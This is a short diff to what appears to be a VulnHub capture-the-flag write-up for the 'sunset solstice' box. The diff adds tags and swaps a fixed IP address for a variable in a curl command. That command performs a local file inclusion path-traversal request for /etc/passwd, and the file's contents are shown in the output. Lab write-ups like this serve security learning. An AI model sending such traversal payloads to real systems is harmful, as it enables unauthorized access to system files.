@@ -3,7 +3,7 @@ title: Vulnhub - sunset solstice
 description: My writeup on sunset solstice box.
 categories:
  - vulnhub
-tags: vulnhub
+tags: vulnhub lfi php suid find logpoisoning
 ---
 
 ![](https://i.pinimg.com/originals/54/1d/f7/541df746fb87996ad2ab1dfbea249cea.png)
@@ -80,7 +80,7 @@ After lot of enumeration, i found an entry point on port `8593` there we can see
 If we click on `Book List` button we can see this on URL : `/index.php?book=list`, i tried for LFI and bingo got it! 
 
 ```
-$ curl http://192.168.1.9:8593/index.php\?book\=../../../../etc/passwd
+$ curl http://$ip:8593/index.php\?book\=../../../../etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
